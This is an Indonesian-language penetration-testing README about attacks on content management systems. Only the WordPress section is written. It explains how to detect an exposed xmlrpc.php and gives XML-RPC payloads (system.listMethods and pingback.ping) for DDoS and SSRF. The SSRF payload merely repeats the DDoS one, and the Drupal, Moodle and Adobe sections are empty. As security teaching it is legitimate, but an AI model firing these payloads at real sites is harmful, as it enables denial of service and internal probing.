# CMS (Content Management System)
## Definisi

Content Management System (CMS) adalah sebuah platform software yang yang memungkinkan pengguna untuk membangun dan mengelola situs web dengan pengetahuan dan sumber daya teknis yang terbatas. Ini memungkinkan pengguna untuk membuat, mengelola, dan memodifikasi konten di situs web dengan Graphic User Interface (GUI) yang membuat interaksi menjadi user friendly tanpa memerlukan pengetahuan teknis apa pun.

## Beberapa Platform yang **Mungkin** rentan akan CMS
1. [Wordpress](https://github.com/rad1zly/penetration-testing/blob/main/Teknik-Serangan/CMS/README.md#teknik-serangan-pada-platform-wordpress)
2. [Adobe Experience Manager](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-adobe-experience-manager)
3. [Drupal](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-drupal)
4. [Moodle](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-moodle)

## Teknik Serangan pada platform Wordpress
Berikut merupakan beberapa *security misconfiguration* yang biasa terjadi pada platform Wordpress beserta *tools* yang bisa digunakan untuk mendeteksi terjadinya kerentanan tersebut. 

### Tool untuk deteksi
1. Wappalyzer
2. WhatRuns
3. BuildWith
4. WpScan

### xmlrpc.php
Ini merupakan kerentanan paling umum pada wordpress, cara mendeteksi kerentanan tersebut adalah sebagai berikut :
* kunjungi site dari ```siteyangdituju.com/xmlrpc.php```
* Mendapatkan pesan error tentang *POST request only*

Kemudian berikut cara melakukan exploitnya:
* Lakukan *intercept* pada *request* dan ubah *method* GET ke POST
* Kemudian masukan payload ini saat POST untuk melihat semua *Method* yang bisa digunakan
    ```
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>
    ```
* Lihat apabila ada *method* ```pingback.ping``` pada list yang ditampilkan
* Jika ada *method* diatas maka bisa dilakukan DDoS dengan *payload* berikut:
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<IP SERVER ANDA>:<port></string></value>
    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
    </value></param></params>
    </methodCall>
    ```
* Selain itu juga bisa dilakukan serangan SSRF (Khusus untuk port internal) dengan payload berikut:
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<IP SERVER ANDA>:<port></string></value>
    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
    </value></param></params>
    </methodCall>
    ```

## Teknik Serangan pada platform Adobe Experience Manager

## Teknik Serangan pada platform Drupal

## Teknik Serangan pada platform Moodle

## Author
**[rad1zly](https://github.com/rad1zly)**


